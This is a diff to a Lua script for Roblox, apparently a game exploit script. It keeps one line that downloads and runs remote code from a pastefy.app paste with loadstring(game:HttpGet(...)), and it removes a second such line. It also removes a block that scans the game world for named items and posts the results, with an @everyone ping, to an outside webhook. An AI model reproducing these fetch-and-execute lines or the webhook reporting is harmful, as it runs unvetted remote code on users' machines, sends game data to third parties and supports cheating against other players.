@@ -8,7 +8,6 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local CoreGui = game:GetService("CoreGui")
 
 loadstring(game:HttpGet("https://pastefy.app/j9ERnU1R/raw", true))()
-loadstring(game:HttpGet("https://pastefy.app/QDcXcBjN/raw", true))()
 
 local player = Players.LocalPlayer
 local username = player.Name
@@ -166,25 +165,3 @@ local targets = {
 ["Ketchuru and Musturu"]=true,["Nuclearo Dinossauro"]=true,["La Taco Combinasion"]=true,
 ["Rosey and Teddy"]=true,["Dragon Gingerini"]=true
 }
-
-local foundTargets = {}
-
-for _,v in pairs(workspace:GetDescendants()) do
-if targets[v.Name] then
-table.insert(foundTargets,v.Name)
-end
-end
-
-local message
-
-if #foundTargets > 0 then
-message = "@everyone Targets Found:\n"..table.concat(foundTargets,"\n")
-else
-message = "No targets found."
-end
-
-pcall(function()
-HttpService:PostAsync(webhook,HttpService:JSONEncode({
-content = message
-}))
-end)
